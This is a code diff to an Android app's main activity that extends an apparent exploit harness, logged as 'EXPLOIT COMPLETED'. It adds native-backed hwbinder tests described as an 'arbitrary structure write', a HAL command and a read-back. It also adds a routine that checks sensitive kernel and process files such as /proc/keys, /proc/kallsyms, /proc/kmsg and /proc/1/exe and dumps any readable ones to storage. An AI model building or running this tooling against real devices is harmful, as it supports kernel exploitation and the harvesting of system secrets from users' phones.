@@ -88,6 +88,9 @@ public class MainActivity extends AppCompatActivity {
     public static native String nativeHwbinderOverflowTest(int fd);
     public static native String nativeBinderGetVersion(int fd);
     public static native String nativeBinderIoctlTest(int fd, int cmd, long arg);
+    public static native String nativeHwbinderWriteTest(int fd);
+    public static native String nativeHwbinderHalCommand(int fd);
+    public static native String nativeHwbinderReadTest(int fd);
 
     private ServiceConnection tzConnection = new ServiceConnection() {
         @Override
@@ -250,11 +253,23 @@ public class MainActivity extends AppCompatActivity {
         appendLog("[*] Hwbinder overflow verification test");
         testHwbinderOverflow();
 
+        appendLog("[*] Hwbinder write test (arbitrary structure write)");
+        testHwbinderWrite();
+
+        appendLog("[*] Hwbinder HAL command test");
+        testHwbinderHal();
+
+        appendLog("[*] Hwbinder read test (read back written data)");
+        testHwbinderRead();
+
         appendLog("[*] Binder debugfs information gathering");
         testBinderDebugfs();
 
         appendLog("[*] Testing /dev/binder device");
         testBinderDevice();
+
+        appendLog("[*] Additional /proc file reading and dumping");
+        testProcFiles();
 
         appendLog("========== EXPLOIT COMPLETED ==========");
         appendLog("========================================");
@@ -870,6 +885,72 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
+    private void testHwbinderWrite() {
+        int fd = -1;
+        try {
+            fd = nativeOpenDevice("/dev/hwbinder");
+            appendLog("[HWB_WRITE] /dev/hwbinder open fd=" + fd);
+            if (fd >= 0) {
+                String result = nativeHwbinderWriteTest(fd);
+                appendLog("[HWB_WRITE] Write test result: " + result);
+            } else {
+                appendLog("[HWB_WRITE] Failed to open /dev/hwbinder");
+            }
+        } catch (UnsatisfiedLinkError ule) {
+            appendLog("[HWB_WRITE] native method not implemented: " + ule.getMessage());
+        } catch (Exception e) {
+            appendLog("[HWB_WRITE] Exception: " + e.getMessage());
+        } finally {
+            if (fd >= 0) {
+                try { ParcelFileDescriptor.adoptFd(fd).close(); } catch (Exception ignored) {}
+            }
+        }
+    }
+
+    private void testHwbinderHal() {
+        int fd = -1;
+        try {
+            fd = nativeOpenDevice("/dev/hwbinder");
+            appendLog("[HWB_HAL] /dev/hwbinder open fd=" + fd);
+            if (fd >= 0) {
+                String result = nativeHwbinderHalCommand(fd);
+                appendLog("[HWB_HAL] HAL command result: " + result);
+            } else {
+                appendLog("[HWB_HAL] Failed to open /dev/hwbinder");
+            }
+        } catch (UnsatisfiedLinkError ule) {
+            appendLog("[HWB_HAL] native method not implemented: " + ule.getMessage());
+        } catch (Exception e) {
+            appendLog("[HWB_HAL] Exception: " + e.getMessage());
+        } finally {
+            if (fd >= 0) {
+                try { ParcelFileDescriptor.adoptFd(fd).close(); } catch (Exception ignored) {}
+            }
+        }
+    }
+
+    private void testHwbinderRead() {
+        int fd = -1;
+        try {
+            fd = nativeOpenDevice("/dev/hwbinder");
+            appendLog("[HWB_READ] /dev/hwbinder open fd=" + fd);
+            if (fd >= 0) {
+                String result = nativeHwbinderReadTest(fd);
+                appendLog("[HWB_READ] Read test result: " + result);
+            } else {
+                appendLog("[HWB_READ] Failed to open /dev/hwbinder");
+            }
+        } catch (UnsatisfiedLinkError ule) {
+            appendLog("[HWB_READ] native method not implemented: " + ule.getMessage());
+        } catch (Exception e) {
+            appendLog("[HWB_READ] Exception: " + e.getMessage());
+        } finally {
+            if (fd >= 0) {
+                try { ParcelFileDescriptor.adoptFd(fd).close(); } catch (Exception ignored) {}
+            }
+        }
+    }
+
     private void testBinderDebugfs() {
         String[] debugFiles = {
                 "/sys/kernel/debug/binder/state",
@@ -903,7 +984,7 @@ public class MainActivity extends AppCompatActivity {
                 String version = nativeBinderGetVersion(fd);
                 appendLog("[BINDER_DEV] Version info: " + version);
 
-                int cmd = 0x40046201; // BINDER_VERSION (from binder.h)
+                int cmd = 0x40046201;
                 String ioctlResult = nativeBinderIoctlTest(fd, cmd, 0);
                 appendLog("[BINDER_DEV] Ioctl test result: " + ioctlResult);
 
@@ -921,6 +1002,48 @@ public class MainActivity extends AppCompatActivity {
                 try {
                     ParcelFileDescriptor.adoptFd(fd).close();
                 } catch (Exception ignored) {}
+            }
+        }
+    }
+
+    private void testProcFiles() {
+        File dumpDir = getDumpDir();
+        if (dumpDir == null) { appendLog("[PROCFILES] Cannot get dump dir"); return; }
+
+        String[] procPaths = {
+                "/proc/fb", "/proc/keys", "/proc/kmsg", "/proc/misc", "/proc/iomem",
+                "/proc/locks", "/proc/swaps", "/proc/crypto", "/proc/vmstat", "/proc/cgroups",
+                "/proc/cmdline", "/proc/devices", "/proc/ioports", "/proc/loadavg",
+                "/proc/consoles", "/proc/kallsyms", "/proc/slabinfo", "/proc/buddyinfo",
+                "/proc/diskstats", "/proc/key-users", "/proc/schedstat", "/proc/kpagecount",
+                "/proc/kpageflags", "/proc/partitions", "/proc/execdomains", "/proc/sched_debug",
+                "/proc/vmallocinfo", "/proc/pagetypeinfo", "/proc/sysrq-trigger",
+                "/proc/uid_time_in_state", "/proc/self/root/init", "/proc/self/exe",
+                "/proc/uid/0", "/proc/uid/1000", "/proc/1/exe"
+        };
+
+        for (String path : procPaths) {
+            if (stopRequested.get()) break;
+            File f = new File(path);
+            boolean exists = f.exists();
+            boolean canRead = f.canRead();
+            appendLog("[PROCFILES] " + path + " exists=" + exists + ", readable=" + canRead);
+            if (exists && canRead) {
+                String content = safeReadFile(path);
+                if (content != null && !content.isEmpty()) {
+                    appendLog("[PROCFILES] " + path + " content (first 200): " + content.substring(0, Math.min(200, content.length())));
+                } else {
+                    appendLog("[PROCFILES] " + path + " (empty/unreadable)");
+                }
+                if (f.length() < 20 * 1024 * 1024) {
+                    String fileName = "proc_" + path.replace('/', '_') + ".bin";
+                    File out = new File(dumpDir, fileName);
+                    if (dumpFileToDownload(path, out, 30 * 1024 * 1024)) {
+                        appendLog("[PROCFILES] Dumped " + path + " to " + out.getAbsolutePath());
+                    } else {
+                        appendLog("[PROCFILES] Failed to dump " + path);
+                    }
+                }
             }
         }
     }
